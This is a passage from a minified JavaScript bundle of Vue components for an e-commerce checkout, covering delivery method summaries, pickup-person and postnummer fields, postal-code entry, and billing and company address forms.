r,i,a,o,s,l,c;r=e("./home-delivery-summary/home-delivery-summary.vue"),i=e("./pickup-point-summary/pickup-point-summary.vue"),a=e("./click-and-collect-summary/click-and-collect-summary.vue"),s=(o=e("vuex")).mapState,l=o.mapGetters,c=e("../../address-form-utils"),t.exports={mixins:[c],computed:_objectSpread(_objectSpread(_objectSpread(_objectSpread(_objectSpread({},s("delivery",{deliveryAddress:function(e){return e.deliverySummary.deliveryAddress},resources:function(e){return e.resources}})),l("addressBook",["hasSavedAddress"])),l("details",["getFormAsJSON"])),s("details",["countryCode"])),{},{showDeliveryAddress:function(){return"homeDelivery"===this.deliveryMethod.id&&this.hasSavedAddress},formatedAddress:function(){return this.formatAddress(this.deliveryAddress,this.resources.addressFormat)},showDeliveryTemporaryAddressUS:function(){return"homeDelivery"===this.deliveryMethod.id&&this.formatedTemporaryAddressUS},deliveryTemporaryAddressUS:function(){var e=this.getFormAsJSON("shippingAddress");return e&&e.postalCode?e:""},formatedTemporaryAddressUS:function(){return!("US"!==this.countryCode||this.hasSavedAddress||!this.deliveryTemporaryAddressUS)&&this.formatAddress(this.deliveryTemporaryAddressUS,this.resources.addressFormat)}}),data:function(){var e=this.$store.getters["delivery/selectedDeliveryMethod"];return{deliveryMethod:e,deliveryOption:this.$store.getters["delivery/selectedDeliveryOption"],summaryType:function(e){switch(e){case"pickupPoint":return i;case"pickupInStore":return a;default:return r}}(e.id)}}},t.exports.__esModule&&(t.exports=t.exports.default);var u,d="function"==typeof t.exports?t.exports.options:t.exports;d.functional,d.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",[n("div",{staticClass:"section-summary-row"},[n("span",[e._v(e._s(e.deliveryMethod.methodLabel))]),e._v(" "),n("span",{staticClass:"method-price"},[e._v(e._s(e.deliveryOption?e.deliveryOption.price:e.deliveryMethod.price))])]),e._v(" "),e.showDeliveryAddress&&e.deliveryAddress?n("div",{staticClass:"section-summary-row"},[n("span",[e._v(e._s(e.deliveryAddress.firstName)+" "+e._s(e.deliveryAddress.lastName))]),e._v(" "),n("span",{domProps:{innerHTML:e._s(e.formatedAddress)}})]):e._e(),e._v(" "),e.showDeliveryTemporaryAddressUS&&e.deliveryTemporaryAddressUS?n("div",{staticClass:"section-summary-row"},[n("span",[e._v(e._s(e.deliveryTemporaryAddressUS.firstName)+" "+e._s(e.deliveryTemporaryAddressUS.lastName))]),e._v(" "),n("span",{domProps:{innerHTML:e._s(e.formatedTemporaryAddressUS)}})]):e._e(),e._v(" "),n(e.summaryType,{tag:"component",attrs:{deliveryOption:e.deliveryOption,title:e.deliveryMethod.previewTitle}})],1)},d.staticRenderFns=[],t.hot&&((u=e("vue-hot-reload-api")).install(e("vue"),!0),u.compatible&&(t.hot.accept(),t.hot.data?u.reload("data-v-165cba5f",d):u.createRecord("data-v-165cba5f",d)))},{"../../address-form-utils":299,"./click-and-collect-summary/click-and-collect-summary.vue":318,"./home-delivery-summary/home-delivery-summary.vue":320,"./pickup-point-summary/pickup-point-summary.vue":321,vue:279,"vue-hot-reload-api":275,vuex:281}],320:[function(e,t,n){t.exports={props:["deliveryOption","title"]},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return e.deliveryOption?n("div",{staticClass:"section-summary-row"},[n("span",[e._v(e._s(e.title))]),e._v(" "),n("span",{staticClass:"body-text"},[n("span",{staticClass:"icon",class:e.deliveryOption.cssClass}),e._v(" "),n("span",[n("b",[e._v(e._s(e.deliveryOption.name))]),n("br"),e._v("\n          "+e._s(e.deliveryOption.description)+"\n      ")])])]):e._e()},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-baa0ef76",i):r.createRecord("data-v-baa0ef76",i)))},{vue:279,"vue-hot-reload-api":275}],321:[function(e,t,n){var r;r=e("vuex").mapGetters,t.exports={props:["deliveryOption","title"],computed:_objectSpread({},r("delivery",["postnummer"]))},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return e.deliveryOption?n("div",{staticClass:"section-summary-row"},[n("span",[e._v(e._s(e.title))]),e._v(" "),n("span",{staticClass:"body-text"},[n("span",{staticClass:"icon icon-location-alt"}),e._v(" "),n("span",[n("b",[e._v(e._s(e.deliveryOption.name))]),n("br"),e._v(" "),n("span",{domProps:{innerHTML:e._s(e.deliveryOption.description)}}),n("br"),e._v(" "),e.postnummer?n("span",[e._v(e._s(e.postnummer.dHLPostNummer))]):e._e()])]),e._v(" "),n("span",{staticClass:"store-distance"},[e._v(" "+e._s(e.deliveryOption.distance))])]):e._e()},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-65c0468d",a):i.createRecord("data-v-65c0468d",a)))},{vue:279,"vue-hot-reload-api":275,vuex:281}],322:[function(e,t,n){var r,i,a,o,s,l,c,u,d,p,h,f;i=(r=e("vuex")).mapState,a=r.mapGetters,o=e("./postal-code-form/postal-code-form.vue"),s=e("./delivery-method-tile-list/delivery-method-tile-list.vue"),l=e("./delivery-option-tile-list/delivery-option-tile-list.vue"),c=e("./delivery-summary/delivery-summary.vue"),u=e("./pickup-person/pickup-person.vue"),d=e("./address-picker/address-picker.vue"),p=e("./postnummer-field/postnummer.vue"),h=e("./giftwrapping-utils"),f=e("./boxberry/boxberry-utils"),t.exports={mixins:[h,f],data:function(){return{useSameAsShippingBackup:!0,postalCodeBackup:this.$store.getters["delivery/postalCodeValue"],selectedAddressBackup:this.$store.state.delivery.deliverySummary.deliveryAddress,selectedMethodIdBackup:this.$store.getters["delivery/selectedDeliveryMethod"].id,selectedOptionIdBackup:this.$store.getters["delivery/selectedDeliveryOption"]?this.$store.getters["delivery/selectedDeliveryOption"].id:"",pickupPersonBackup:{isSomeoneElse:!1,firstName:"",lastName:""},showSpinner:!1}},computed:_objectSpread(_objectSpread(_objectSpread(_objectSpread(_objectSpread({},i("delivery",["resources","deliverySummary","postalCode","isMember","exclusionResults","deliveryMethods","showEditModeError","skipPostalCode"])),i("addressBook",["addresses","selectedAddresses"])),a("delivery",["selectedDeliveryMethod","selectedDeliveryOption","isPickupPersonValid","pickupPerson","postalCodeValue","isPostnummerValid","isPostnummerExist"])),a("addressBook",["hasSavedAddress"])),{},{editMode:function(){return this.$store.state.delivery.deliverySummary.editMode},enableOptionsChanges:function(){var e=this.$store.getters["delivery/selectedDeliveryMethod"];return e&&(e.options.length||this.isBoxberryPickupPointMethodSelected)},showExclusionError:function(){return Boolean(this.exclusionResults.errorMessage&&this.exclusionResults.excludedPostal)},optionsSwitchVisible:function(){return this.editMode&&this.deliveryMethods.some((function(e){return e.enabled}))},shouldShowAddressPicker:function(){return this.editMode&&"homeDelivery"===this.selectedDeliveryMethod.id&&this.hasSavedAddress&&this.selectedDeliveryMethod.selected},shouldShowEditModeButtons:function(){return!this.showExclusionError&&this.editMode&&(this.hasSavedAddress||this.deliverySummary.hasLastOrder&&this.deliverySummary.hasPostalCodePreApplied)}}),mounted:function(){this.giftWrapData&&this.giftWrapData.showGiftWrapMessage&&this.showGiftwrapInfoModal(this.giftWrapData.giftWrapModalText,this.giftWrapResources.giftWrapModalTitle,this.giftWrapResources.giftWrapModalButtonText),this.backupData()},methods:{setEditMode:function(e){this.$store.commit("delivery/setEditMode",e)},backupData:function(){this.postalCodeBackup=this.postalCodeValue;var e=this.selectedAddresses&&this.selectedAddresses.selectedShippingAddressId?this.$store.getters["addressBook/getSelectedAddressByType"]("shipping"):null;this.selectedMethodIdBackup=this.selectedDeliveryMethod?this.selectedDeliveryMethod.id:"",this.selectedOptionIdBackup=this.selectedDeliveryOption?this.selectedDeliveryOption.id:"",this.selectedAddressIdBackup=this.selectedAddresses?this.selectedAddresses.selectedShippingAddressId:"",this.tempAddressBackup=e&&e.temporary?e.fieldValues:null,this.pickupPersonBackup=_objectSpread({},this.pickupPerson)},saveData:function(){var e=this;return _asyncToGenerator(regeneratorRuntime.mark((function t(){var n,r;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.showSpinner=!0,e.$store.commit("delivery/validatePickupPerson"),e.isPostnummerExist&&e.$store.commit("delivery/validatePostnummer"),e.isPickupPersonValid&&e.isPostnummerValid){t.next=6;break}return e.showSpinner=!1,t.abrupt("return");case 6:if(e.shouldShowAddressPicker)return n=e.$store.getters["addressBook/getSelectedAddressByType"]("shipping"),r={addressId:n.id,type:"shipping",recalculateTax:!0},n.temporary&&(r.tempAddress=n.fieldValues),t.next=12,e.$store.dispatch("addressBook/updateSelectedAddress",r);t.next=16;break;case 12:if(t.sent){t.next=16;break}return e.showSpinner=!1,t.abrupt("return");case 16:e.$store.dispatch("delivery/updatePickupPerson"),e.isPostnummerExist&&e.$store.dispatch("delivery/updatePostnummer"),e.showSpinner=!1,e.$store.commit("delivery/setShowEditModeError",!1),e.$store.commit("delivery/setEditMode",!1),document.getElementById("deliverySection").scrollIntoView({behavior:"smooth"});case 22:case"end":return t.stop()}}),t)})))()},revertEdit:function(){var e=this;return _asyncToGenerator(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.postalCodeBackup!==e.postalCodeValue)return e.$store.commit("delivery/setPostalCode",e.postalCodeBackup),t.next=4,e.$store.dispatch("delivery/submitPostalCode");t.next=4;break;case 4:if(e.$store.commit("delivery/selectDeliveryMethod",e.selectedMethodIdBackup),e.$store.commit("delivery/selectDeliveryOption",e.selectedOptionIdBackup),e.$store.commit("delivery/setPickupPersonFieldValue",{fieldId:"isSomeoneElse",value:e.pickupPersonBackup.isSomeoneElse}),e.$store.commit("delivery/setPickupPersonFieldValue",{fieldId:"firstName",value:e.pickupPersonBackup.firstName}),e.$store.commit("delivery/setPickupPersonFieldValue",{fieldId:"lastName",value:e.pickupPersonBackup.lastName}),e.isPostnummerExist)return e.$store.commit("delivery/setPostnummerFieldValue",{fieldId:"postnummerValue",value:""}),t.next=13,e.$store.dispatch("delivery/updatePostnummer");t.next=13;break;case 13:return t.next=15,e.$store.dispatch("delivery/updateSelectedOptionAndMethod");case 15:if(e.selectedAddressIdBackup&&"homeDelivery"===e.selectedMethodIdBackup)return t.next=18,e.$store.dispatch("addressBook/updateSelectedAddress",{addressId:e.selectedAddressIdBackup,type:"shipping",tempAddress:e.tempAddressBackup});t.next=21;break;case 18:if(t.sent){t.next=21;break}return t.abrupt("return");case 21:e.$store.commit("delivery/setEditMode",!1);case 22:case"end":return t.stop()}}),t)})))()},handleInteraction:function(e){this.$store.commit("analytics/handleDeliveryInteraction",e.target)}},watch:{selectedDeliveryMethod:function(e,t){var n="homeDelivery"===e.id&&this.useSameAsShippingBackup;"homeDelivery"===t.id&&(this.useSameAsShippingBackup=this.$store.getters["details/getFieldValue"]("billingAddress","useSameAsShipping")),"homeDelivery"===t.id&&"homeDelivery"===e.id||this.$store.commit("details/updateFieldValue",{formId:"billingAddress",fieldId:"useSameAsShipping",value:n})}},components:{PostalCodeForm:o,DeliverySummary:c,DeliveryMethodTileList:s,DeliveryOptionTileList:l,PickupPerson:u,Postnummer:p,AddressPicker:d}},t.exports.__esModule&&(t.exports=t.exports.default);var A,m="function"==typeof t.exports?t.exports.options:t.exports;m.functional,m.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("section",{staticClass:"checkout-section",attrs:{id:"deliverySection"},on:{click:e.handleInteraction}},[n("div",{staticClass:"section-header"},[n("h2",[e._v(e._s(e.resources.blockLabel))]),e._v(" "),e.editMode||e.skipPostalCode&&!e.isMember?e._e():n("button",{staticClass:"btn btn--secondary",on:{click:function(t){e.backupData(),e.setEditMode(!0)}}},[e._v("\n      "+e._s(e.resources.editCTA)+"\n    ")])]),e._v(" "),e.editMode?e._e():n("delivery-summary"),e._v(" "),e.editMode&&!e.hasSavedAddress?n("postal-code-form"):e._e(),e._v(" "),n("delivery-method-tile-list"),e._v(" "),e.editMode&&e.hasSavedAddress&&!e.shouldShowAddressPicker?n("postal-code-form"):e._e(),e._v(" "),e.shouldShowAddressPicker?n("address-picker",{attrs:{type:"shipping"}}):e._e(),e._v(" "),e.showExclusionError?n("div",{staticClass:"section-row"},[n("div",{staticClass:"inline-alert error"},[n("span",[e._v(e._s(e.exclusionResults.errorMessage))])])]):e._e(),e._v(" "),e.resources.additionalDeliveryMessage?n("div",{staticClass:"section-row"},[n("div",{staticClass:"inline-alert notify"},[n("span",[e._v(e._s(e.resources.additionalDeliveryMessage))])])]):e._e(),e._v(" "),!e.showExclusionError&&e.editMode&&e.enableOptionsChanges?n("delivery-option-tile-list"):e._e(),e._v(" "),e.editMode&&e.selectedDeliveryMethod.enabled&&"pickupPoint"===e.selectedDeliveryMethod.id?n("pickup-person",{ref:"pickupPerson"}):e._e(),e._v(" "),e.isPostnummerExist&&e.editMode&&e.selectedDeliveryMethod.enabled&&"pickupPoint"===e.selectedDeliveryMethod.id?n("postnummer"):e._e(),e._v(" "),e.shouldShowEditModeButtons?n("div",{staticClass:"section-row"},[e.showEditModeError?n("div",{staticClass:"inline-alert error"},[n("span",[e._v(e._s(e.resources.saveDeliverySettingsWarning))])]):e._e(),e._v(" "),e.editMode?n("footer",{staticClass:"section-footer"},[n("button",{staticClass:"btn",attrs:{disabled:e.showSpinner},on:{click:e.saveData}},[n("div",{class:["spinner","white-spinner",{"spinner-visible":e.showSpinner}]},[n("span"),e._v(" "),n("span"),e._v(" "),n("span")]),e._v(" "),e.showSpinner?e._e():[e._v("\n            "+e._s(e.resources.saveDeliverySettingCTA)+"\n        ")]],2),e._v(" "),n("button",{staticClass:"link",on:{click:e.revertEdit}},[e._v(e._s(e.resources.cancelCTA))])]):e._e()]):e._e()],1)},m.staticRenderFns=[],t.hot&&((A=e("vue-hot-reload-api")).install(e("vue"),!0),A.compatible&&(t.hot.accept(),t.hot.data?A.reload("data-v-d19d67d8",m):A.createRecord("data-v-d19d67d8",m)))},{"./address-picker/address-picker.vue":307,"./boxberry/boxberry-utils":308,"./delivery-method-tile-list/delivery-method-tile-list.vue":310,"./delivery-option-tile-list/delivery-option-tile-list.vue":313,"./delivery-summary/delivery-summary.vue":319,"./giftwrapping-utils":323,"./pickup-person/pickup-person.vue":325,"./postal-code-form/postal-code-form.vue":326,"./postnummer-field/postnummer.vue":327,vue:279,"vue-hot-reload-api":275,vuex:281}],323:[function(e,t,n){var r=e("vuex").mapState;t.exports={computed:_objectSpread({},r("orderSummary",{giftWrapResources:function(e){return e.resources},giftWrapData:function(e){return e.giftWrapData}})),methods:{showGiftwrapInfoModal:function(e,t,n){window.eventBus.$emit("shouldOpenModal",{resources:{heading:t,headingLarge:!0},paragraphs:[{text:e}],buttons:[{type:"btn",label:n,shouldCloseModal:!0}],row:{class:"center-align"},closeElement:{shouldCloseModal:!0},ctaHolder:{},modalFullWidth:!1,modalLarge:!0})}}}},{vuex:281}],324:[function(e,t,n){t.exports={props:["isHorizontal","number"],data:function(){return{wrapperClass:this.isHorizontal?"horizontal":"vertical"}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{class:[e.wrapperClass+"-tile-list"]},e._l(e.number,(function(t){return n("div",{key:t,staticClass:"checkout-tile"},[n("div",{staticClass:"skeleton-loader"},[n("div",{class:["skeleton-mask",{square:e.isHorizontal}]})])])})),0)},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-279833ff",i):r.createRecord("data-v-279833ff",i)))},{vue:279,"vue-hot-reload-api":275}],325:[function(e,t,n){var r,i,a,o;i=(r=e("vuex")).mapState,a=r.mapMutations,o=e("../../../vue-form/vue-input/vue-input.vue"),t.exports={computed:i("delivery",{firstName:function(e){return e.pickupPerson.firstName},lastName:function(e){return e.pickupPerson.lastName},isSomeoneElse:function(e){return e.pickupPerson.isSomeoneElse},resources:function(e){return e.pickupPerson.resources},showPickupPersonBlock:function(e){return e.pickupPerson.showPickupPersonBlock}}),methods:_objectSpread({},a("delivery",["setPickupPersonFieldValue"])),components:{VueInput:o}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return!e.updating&&e.showPickupPersonBlock.state.value?n("div",{staticClass:"section-row"},[n("div",{staticClass:"vue-form"},[n("div",{staticClass:"vue-form-row"},[n("vue-input",{attrs:{element:e.isSomeoneElse},on:{blur:function(t){return e.setPickupPersonFieldValue({fieldId:"isSomeoneElse",value:t.target.value})}}})],1),e._v(" "),e.isSomeoneElse.state.value?n("div",{staticClass:"pickup-person-form"},[n("span",{staticClass:"section-row-description"},[e._v(" "+e._s(e.resources.description))]),e._v(" "),n("div",{staticClass:"vue-form-row has-multiple-elements"},[n("vue-input",{attrs:{element:e.firstName},on:{blur:function(t){return e.setPickupPersonFieldValue({fieldId:"firstName",value:t.target.value})}}}),e._v(" "),n("vue-input",{attrs:{element:e.lastName},on:{blur:function(t){return e.setPickupPersonFieldValue({fieldId:"lastName",value:t.target.value})}}})],1)]):e._e()])]):e._e()},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-2d26ce66",l):s.createRecord("data-v-2d26ce66",l)))},{"../../../vue-form/vue-input/vue-input.vue":426,vue:279,"vue-hot-reload-api":275,vuex:281}],326:[function(e,t,n){var r,i,a;r=e("vuex").mapState,i=e("../../../vue-form/vue-input/vue-input.vue"),a=e("../giftwrapping-utils"),t.exports={mixins:[a],computed:r("delivery",{heading:function(e){return e.postalCodeForm.heading},fieldData:function(e){return e.postalCodeForm.form.formElements[0]},buttonData:function(e){return e.postalCodeForm.form.actions[0]}}),methods:{setPostalCode:function(e){this.$store.commit("delivery/setPostalCode",e)},submitPostalCode:function(){var e=this;return _asyncToGenerator(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.$store.dispatch("delivery/submitPostalCode");case 2:e.giftWrapData&&e.giftWrapData.showGiftWrapMessage&&e.showGiftwrapInfoModal(e.giftWrapData.giftWrapModalText,e.giftWrapResources.giftWrapModalTitle,e.giftWrapResources.giftWrapModalButtonText);case 3:case"end":return t.stop()}}),t)})))()}},components:{VueInput:i}},t.exports.__esModule&&(t.exports=t.exports.default);var o,s="function"==typeof t.exports?t.exports.options:t.exports;s.functional,s.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"section-row"},[n("span",{staticClass:"section-row-header"},[e._v(e._s(e.heading))]),e._v(" "),n("form",{staticClass:"vue-form",attrs:{method:"POST",novalidate:"novalidate"},on:{submit:function(t){return t.preventDefault(),e.submitPostalCode(t)}}},[n("div",{staticClass:"vue-form"},[n("div",{staticClass:"vue-form-row has-multiple-elements"},[n("vue-input",{attrs:{element:e.fieldData},on:{input:function(t){return e.setPostalCode(t.target.value)}}}),e._v(" "),n("vue-input",{attrs:{element:e.buttonData}})],1)])])])},s.staticRenderFns=[],t.hot&&((o=e("vue-hot-reload-api")).install(e("vue"),!0),o.compatible&&(t.hot.accept(),t.hot.data?o.reload("data-v-567a5eff",s):o.createRecord("data-v-567a5eff",s)))},{"../../../vue-form/vue-input/vue-input.vue":426,"../giftwrapping-utils":323,vue:279,"vue-hot-reload-api":275,vuex:281}],327:[function(e,t,n){var r,i,a,o;i=(r=e("vuex")).mapState,a=r.mapMutations,o=e("../../../vue-form/vue-input/vue-input.vue"),t.exports={computed:_objectSpread({},i("delivery",{postnummer:function(e){return e.postnummer.postnummerValue},resources:function(e){return e.postnummer.resources}})),methods:_objectSpread({},a("delivery",["setPostnummerFieldValue"])),components:{VueInput:o}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return e.updating?e._e():n("div",{staticClass:"section-row"},[n("div",{staticClass:"vue-form"},[n("div",{staticClass:"postnummer-form"},[n("div",{staticClass:"vue-form-row has-multiple-elements"},[n("vue-input",{attrs:{element:e.postnummer},on:{blur:function(t){return e.setPostnummerFieldValue({fieldId:"postnummerValue",value:t.target.value})}}})],1)])])])},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-94d0bc1c",l):s.createRecord("data-v-94d0bc1c",l)))},{"../../../vue-form/vue-input/vue-input.vue":426,vue:279,"vue-hot-reload-api":275,vuex:281}],328:[function(e,t,n){var r;r=e("../../address-form-utils"),t.exports={mixins:[r],props:["addressId","addressFormat"],computed:{address:function(){return this.getAddressById(this.addressId)},formatedAddress:function(){return this.formatAddress(this.address.fieldValues,this.addressFormat)}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"address-summary"},[n("span",[e._v(e._s(e.address.fieldValues.firstName)+" "+e._s(e.address.fieldValues.lastName)+" "),n("br")]),e._v(" "),e.address.fieldValues.companyName?n("span",[e._v(e._s(e.address.fieldValues.companyName)+" "),n("br")]):e._e(),e._v(" "),n("span",{domProps:{innerHTML:e._s(e.formatedAddress)}})])},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-46d8fce3",a):i.createRecord("data-v-46d8fce3",a)))},{"../../address-form-utils":299,vue:279,"vue-hot-reload-api":275}],329:[function(e,t,n){!function(){var n=e("vuex"),r=n.mapState,i=n.mapGetters,a=e("../../../vue-form/vue-input/vue-input.vue"),o=e("../../../vue-form/vue-input/inputs/vue-input-button.vue"),s=e("../../../vue-form/vue-form/vue-form.vue"),l=e("../../delivery/address-picker/address-picker.vue"),c=e("../address-summary/address-summary.vue"),u=e("../../address-form-utils");t.exports={mixins:[u],computed:_objectSpread(_objectSpread(_objectSpread(_objectSpread({},r("details",["resources","countryCode","forms"])),r("addressBook",{addressBookResources:"resources",selectedAddresses:function(e){return e.selectedAddresses}})),i("addressBook",["hasSavedAddress"])),{},{rowIndexes:function(){return{salutation:this.formRows.findIndex((function(e){return"salutation"===e[0].id})),addressSearch:this.formRows.findIndex((function(e){return"addressSearch"===e[0].id})),vat:this.formRows.findIndex((function(e){return"btwVatNumber"===e[0].id||"nifNumber"===e[0].id})),houseNumberExtension:this.formRows.findIndex((function(e){return"addressSearchDummy"===e[0].id}))}},noSavedBillingAddresUS:function(){return!this.selectedAddresses.selectedBillingAddressId&&"US"===this.countryCode},sameAsDeliveryAddress:function(){return this.formRows[0][0]},showNifNumber:function(){return this.formRows[10][0].state.value},getFormField:function(){return d[this.countryCode]||d.default},namesRows:function(){return-1!==this.rowIndexes.addressSearch?this.formRows.slice(this.rowIndexes.salutation,this.rowIndexes.addressSearch):this.getFormField.namesRows(this.formRows,this.rowIndexes)},addressSearchRow:function(){return-1!==this.rowIndexes.addressSearch?this.formRows[this.rowIndexes.addressSearch]:null},hiddenRows:function(){return-1!==this.rowIndexes[this.getFormField.addressSearchIndex]?this.getFormField.hiddenRows(this.formRows,this.rowIndexes):null},vatRows:function(){var e=-1!==this.rowIndexes.vat?this.formRows.slice(this.rowIndexes.vat):null,t=e?e.findIndex((function(e){return"nifNumber"===e[0].id})):null;return t&&-1<t&&!this.showNifNumber?(e.splice(t,1),e):-1!==this.rowIndexes.vat?this.formRows.slice(this.rowIndexes.vat):null},isHomeDelivery:function(){var e=this.$store.getters["delivery/selectedDeliveryMethod"];return e&&"homeDelivery"===e.id}}),data:function(){var e=this.$store.state.details.forms.billingAddress.formElements,t=this.layoutElements(e);return{formRows:t,formId:"billingAddress",addressFieldsHidden:this.shouldShowHiddenFields(t)}},components:{VueForm:s,VueInput:a,VueInputButton:o,AddressPicker:l,AddressSummary:c}};var d={RU:{hiddenRows:function(e,t){return e.slice(t.addressSearch+1,e.length)},namesRows:function(e,t){return e.slice(t.addressSearch+1,e.length)},addressSearchIndex:"addressSearch"},NL:{hiddenRows:function(e,t){return e.slice(t.houseNumberExtension+1,t.vat)},namesRows:function(e,t){return e.slice(t.salutation,t.houseNumberExtension)},addressSearchIndex:"houseNumberExtension"},default:{hiddenRows:function(e,t){return e.slice(t.addressSearch+1,t.vat)},namesRows:function(e,t){return e.slice(t.salutation,t.vat)},addressSearchIndex:"addressSearch"}}}(),t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"billing-details"},[n("div",{staticClass:"section-row"},[n("div",{staticClass:"section-row-header"},[e._v("\n            "+e._s(e.resources.billingAddressHeader)+"\n        ")]),e._v(" "),e.isHomeDelivery?n("div",{staticClass:"vue-form-row"},[n("vue-input",{attrs:{element:e.sameAsDeliveryAddress},on:{blur:function(t){return e.updateFieldValue(e.sameAsDeliveryAddress.id,t.target.value)}}})],1):e._e()]),e._v(" "),e.sameAsDeliveryAddress.state.value||e.hasSavedAddress&&!e.noSavedBillingAddresUS?e._e():[n("div",{staticClass:"section-row"},e._l(e.namesRows,(function(t,r){return n("div",{key:r,class:["vue-form-row",{"has-multiple-elements":1<t.length}]},e._l(t,(function(t){return n("vue-input",{key:t.id,attrs:{element:t},on:{blur:function(n){return e.updateFieldValue(t.id,n.target.value)}}})})),1)})),0),e._v(" "),e.addressSearchRow&&e.addressFieldsHidden?n("div",{staticClass:"section-row"},[n("div",{staticClass:"vue-form-row"},[n("vue-input",{attrs:{element:e.addressSearchRow[0]}})],1)]):e._e(),e._v(" "),e.hiddenRows&&e.addressFieldsHidden?n("div",{staticClass:"reveal-hidden",on:{click:function(t){e.addressFieldsHidden=!1,e.enableEditBilling=!0}}},[e._v("\n            "+e._s(e.resources.enterAddressCTA)+"\n        ")]):e._e(),e._v(" "),e.hiddenRows&&!e.addressFieldsHidden?n("div",{staticClass:"section-row"},e._l(e.hiddenRows,(function(t,r){return n("div",{key:r,class:["vue-form-row",{"has-multiple-elements":1<t.length}]},e._l(t,(function(t){return n("vue-input",{key:t.id,attrs:{element:t},on:{blur:function(n){return e.updateFieldValue(t.id,n.target.value)}}})})),1)})),0):e._e()],e._v(" "),e.sameAsDeliveryAddress.state.value||!e.hasSavedAddress||e.noSavedBillingAddresUS?e._e():n("address-picker",{attrs:{"header-label":e.resources.billingAddressPickerHeader,"selected-address-id":e.selectedAddresses.selectedBillingAddressId,"selection-mutation":e.updateAddressMutation,type:"billing"}}),e._v(" "),e.sameAsDeliveryAddress.state.value&&e.hasSavedAddress?n("div",{staticClass:"section-row"},[n("address-summary",{attrs:{"address-id":e.selectedAddresses.selectedShippingAddressId,"address-format":e.addressBookResources.addressFormat}})],1):e._e(),e._v(" "),n("div",{staticClass:"section-row"},e._l(e.vatRows,(function(t,r){return n("div",{key:r,class:["vue-form-row",{"has-multiple-elements":1<t.length}]},e._l(t,(function(t){return n("vue-input",{key:t.id,attrs:{element:t},on:{blur:function(n){return e.updateFieldValue(t.id,n.target.value)}}})})),1)})),0),e._v(" "),e._t("default")],2)},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-a2ff0fae",i):r.createRecord("data-v-a2ff0fae",i)))},{"../../../vue-form/vue-form/vue-form.vue":417,"../../../vue-form/vue-input/inputs/vue-input-button.vue":418,"../../../vue-form/vue-input/vue-input.vue":426,"../../address-form-utils":299,"../../delivery/address-picker/address-picker.vue":307,"../address-summary/address-summary.vue":328,vue:279,"vue-hot-reload-api":275,vuex:281}],330:[function(e,t,n){var r,i,a,o,s;i=(r=e("vuex")).mapState,a=r.mapGetters,o=e("../../../vue-form/vue-input/vue-input.vue"),s=e("../../address-form-utils"),t.exports={mixins:[s],computed:_objectSpread(_objectSpread(_objectSpread(_objectSpread({},i("details",["resources","forms"])),i("addressBook",{selectedAddresses:function(e){return e.selectedAddresses}})),a("addressBook",["hasSavedAddress"])),{},{namesRows:function(){return this.formRows}}),data:function(){var e=this.$store.state.details.forms.companydetails.formElements,t=this.layoutElements(e);return{formRows:t,formId:"companydetails",addressFieldsHidden:this.shouldShowHiddenFields(t)}},components:{VueInput:o}},t.exports.__esModule&&(t.exports=t.exports.default);var l,c="function"==typeof t.exports?t.exports.options:t.exports;c.functional,c.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"company-details"},[n("div",{staticClass:"section-row"},[n("div",{staticClass:"section-row-header"},[e._v("\n            "+e._s(e.resources.blockCompanyLabel)+"\n        ")])]),e._v(" "),e.hasSavedAddress?e._e():[n("div",{staticClass:"section-row"},e._l(e.namesRows,(function(t,r){return n("div",{key:r,class:["vue-form-row",{"has-multiple-elements":1<t.length}]},e._l(t,(function(t){return n("vue-input",{key:t.id,attrs:{element:t},on:{blur:function(n){return 